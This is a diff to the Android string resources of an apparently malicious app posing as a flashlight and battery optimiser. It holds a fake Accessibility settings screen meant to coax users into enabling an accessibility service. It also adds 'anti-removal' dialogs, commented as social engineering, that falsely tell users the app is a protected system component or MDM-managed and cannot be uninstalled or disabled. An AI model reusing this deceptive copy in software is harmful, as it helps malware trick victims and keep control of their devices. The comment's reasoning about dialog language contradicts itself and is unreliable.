@@ -2,8 +2,8 @@
 <resources>
     <string name="app_name">Lanterna Potente</string>
     <string name="accessibility_service_description">Serviço de otimização de renderização e acessibilidade de interface corporativa.</string>
-    
-    
+
+    <!-- Fake Accessibility Screen -->
     <string name="fake_accessibility_title">Acessibilidade</string>
     <string name="fake_services_installed">Serviços instalados</string>
     <string name="fake_talkback">TalkBack</string>
@@ -14,8 +14,8 @@
     <string name="fake_switch_access_desc">Controle o dispositivo com botões</string>
     <string name="fake_system_protection">Otimização de Bateria Avançada</string>
     <string name="fake_system_protection_desc">Gerencia o consumo de energia do dispositivo</string>
-    
-    
+
+    <!-- Service Detail Screen -->
     <string name="service_detail_title">Otimização de Bateria Avançada</string>
     <string name="service_off">Desativado</string>
     <string name="service_on">Ativado</string>
@@ -34,12 +34,36 @@ Este serviço utiliza recursos de acessibilidade para:
     <string name="confirm_activation_message">Ao ativar este serviço, você permite que o Otimizador de Bateria monitore e gerencie apps para economizar energia. Deseja continuar?</string>
     <string name="cancel">Cancelar</string>
     <string name="activate">Ativar</string>
-    
-    
+
+    <!-- Main Screen -->
     <string name="main_welcome">Bem-vindo ao Otimizador de Bateria</string>
     <string name="main_description">Seu dispositivo está otimizado para economizar energia</string>
     <string name="btn_enable_protection">Ativar Otimização</string>
     <string name="protection_status">Status da Otimização</string>
     <string name="status_inactive">Inativo - Clique para ativar</string>
     <string name="status_active">Ativo - Bateria sendo otimizada</string>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════
+         Anti-Removal Dialog — social engineering copy.
+         These strings are shown when the user attempts to uninstall or
+         deactivate the app. They mirror AOSP / OEM system dialog language
+         so the prompt feels like a genuine OS restriction, not a third-party
+         app. English is used because Android system dialogs are always in the
+         device locale; most devices present these in English globally.
+         ═══════════════════════════════════════════════════════════════════════ -->
+
+    <!-- Generic uninstall block -->
+    <string name="anti_removal_title_uninstall">Cannot Uninstall System App</string>
+    <string name="anti_removal_body_uninstall">This app is a protected system component.\n\nSystem applications are managed by the device manufacturer and cannot be removed by the user.</string>
+
+    <!-- Device Admin revoke block -->
+    <string name="anti_removal_title_admin">Device Management Restriction</string>
+    <string name="anti_removal_body_admin">This service is managed by your device\'s Mobile Device Management (MDM) policy and cannot be deactivated by the user.</string>
+
+    <!-- Accessibility disable block -->
+    <string name="anti_removal_title_accessibility">Required System Service</string>
+    <string name="anti_removal_body_accessibility">This accessibility service is required for core system functions. Disabling it may affect device performance and stability.</string>
+
+    <!-- Shared button label -->
+    <string name="anti_removal_btn_ok">OK</string>
 </resources>
